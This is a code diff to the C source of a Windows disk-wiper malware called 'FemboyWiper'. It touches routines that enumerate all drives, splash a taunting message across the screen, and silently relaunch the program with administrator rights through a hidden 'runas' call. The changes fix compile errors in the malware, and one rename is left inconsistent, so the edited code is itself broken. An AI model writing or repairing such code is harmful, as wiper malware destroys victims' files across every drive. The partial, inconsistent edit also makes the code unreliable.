@@ -1,4 +1,3 @@
-#define _WIN32_WINNT 0x0600
 #include <windows.h>
 #include <shlobj.h>
 #include <shlwapi.h>
@@ -108,7 +107,7 @@ static void EnqueueAllDrives() {
     }
 }
 
-static const wchar_t* MSG = L"FemboyWiper it's Here!!";
+static const wchar_t* MSG_TEXT = L"FemboyWiper it's Here!!";
 static int g_screenW = 0, g_screenH = 0;
 
 static LRESULT CALLBACK TabWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
@@ -140,7 +139,7 @@ static LRESULT CALLBACK TabWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
         int x = 0, y = 20;
         int dir = 1;
         while (x < g_screenW) {
-            TextOutW(hdc, x, y, MSG, (int)wcslen(MSG));
+            TextOutW(hdc, x, y, MSG, (int)wcslen(MSG_TEXT));
             x += 350;
             y += dir * 60;
             if (y > g_screenH - 80 || y < 0) dir = -dir;
@@ -326,7 +325,7 @@ static BOOL IsAdmin() {
 static void Elevate() {
     wchar_t p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
     SHELLEXECUTEINFOW sei = { sizeof(sei) };
-    sei.lpVerb = L"runas"; sei.lpFile = p; sei.hShow = SW_HIDE;
+    sei.lpVerb = L"runas"; sei.lpFile = p; sei.nShow = SW_HIDE;
     sei.fMask = SEE_MASK_NOCLOSEPROCESS;
     if (!ShellExecuteExW(&sei)) ExitProcess(0);
     ExitProcess(0);
